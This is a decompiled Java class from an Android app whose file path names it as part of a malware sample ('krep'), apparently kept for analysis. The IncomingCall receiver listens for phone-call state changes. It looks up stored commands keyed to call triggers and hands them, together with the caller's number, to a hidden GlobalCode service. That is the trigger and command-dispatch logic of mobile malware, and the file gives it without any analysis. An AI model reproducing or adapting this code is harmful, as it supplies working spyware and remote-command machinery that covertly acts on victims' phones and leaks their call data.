package krep.itmtd.ywtjexf;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class IncomingCall
  extends BroadcastReceiver
{
  public Context ctx;
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    this.ctx = paramContext;
    try
    {
      ((TelephonyManager)paramContext.getSystemService("phone")).listen(new MyPhoneStateListener(), 32);
      return;
    }
    catch (Exception paramContext)
    {
      Log.e("Phone Receive Error", " " + paramContext);
    }
  }
  
  public class MyPhoneStateListener
    extends PhoneStateListener
  {
    public MyPhoneStateListener() {}
    
    public String getcmd(Context paramContext, String paramString)
    {
      return paramContext.getSharedPreferences("Cmd_conf", 0).getString(paramString, "");
    }
    
    public void onCallStateChanged(int paramInt, String paramString)
    {
      Object localObject = IncomingCall.this.ctx.getSharedPreferences("Call_conf", 0).getAll();
      if (((Map)localObject).size() > 0) {
        localObject = ((Map)localObject).keySet().iterator();
      }
      for (;;)
      {
        if (!((Iterator)localObject).hasNext()) {
          return;
        }
        String str1 = (String)((Iterator)localObject).next();
        String str2 = getcmd(IncomingCall.this.ctx, str1);
        if (str2.length() > 2)
        {
          Intent localIntent = new Intent(IncomingCall.this.ctx, GlobalCode.class);
          localIntent.putExtra("content", str2);
          localIntent.putExtra("type", "TriggerCall:" + str1);
          localIntent.putExtra("data", paramInt + ":" + paramString);
          IncomingCall.this.ctx.startService(localIntent);
        }
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/IncomingCall.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */